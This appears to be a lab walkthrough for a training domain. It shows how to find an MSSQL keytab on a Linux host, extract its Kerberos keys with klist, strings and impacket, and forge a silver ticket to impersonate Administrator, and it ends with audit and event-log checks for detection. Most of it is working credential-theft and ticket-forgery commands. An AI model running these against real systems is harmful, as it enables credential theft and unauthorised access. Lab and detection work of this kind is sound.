# WT#046 — Linux Keytab Abuse

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.40 (linux01) |
| **Domain** | cadre.local |
| **Starting Credential** | Post-compromise (local or domain user on linux01) |
| **Tools Required** | klist, impacket-ticketConverter |
| **Certifications** | CAPE |
| **MITRE ATT&CK** | T1555, T1552 |
| **Difficulty** | Medium |

## Prerequisites
- Shell access on linux01 (post-compromise)
- MSSQL keytab present: `/var/opt/mssql/secrets/mssql.keytab`

## Attack Steps

### 1. Locate keytab files
```bash
find / -name "*.keytab" 2>/dev/null
ls -la /var/opt/mssql/secrets/
```

### 2. Read MSSQL keytab entries
```bash
sudo klist -ket /var/opt/mssql/secrets/mssql.keytab
```

### 3. Extract NTHASH / AES keys from keytab
```bash
# Using impacket
impacket-ticketConverter /var/opt/mssql/secrets/mssql.keytab output.ccache

# Or manually extract using strings
sudo strings /var/opt/mssql/secrets/mssql.keytab
```

### 4. Use extracted keys for Kerberos authentication
```bash
# Generate Kirbi file from keytab
impacket-ticketConverter output.ccache ticket.kirbi

# Use with impacket tools
KRB5CCNAME=output.ccache impacket-mssqlclient -k cadre.local/MSSQLSvc@linux01
```

### 5. Silver ticket creation (if hash extracted)
```bash
# With NTHASH in hand, forge silver ticket for MSSQLSvc
impacket-ticketer -nthash <MSSQL_HASH> -domain-sid <DOMAIN_SID> -domain cadre.local -spn MSSQLSvc/linux01.cadre.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k cadre.local/Administrator@linux01
```

## Post-Exploitation Chain
Keytab file access → AES/NTHASH key extraction → Kerberos ticket forgery → Service impersonation

## Telemetry Verification
- **auditd key `keytab_access` or `mssql_keytab`**: Access to `/var/opt/mssql/secrets/mssql.keytab`
- **Event 4768**: TGS requests for MSSQLSvc/linux01
- **File access audit**: Keytab file read events

## Status
CONFIGURED — keytab exists at /var/opt/mssql/secrets/mssql.keytab (verified by 09-sql-wsus-verify.yml)
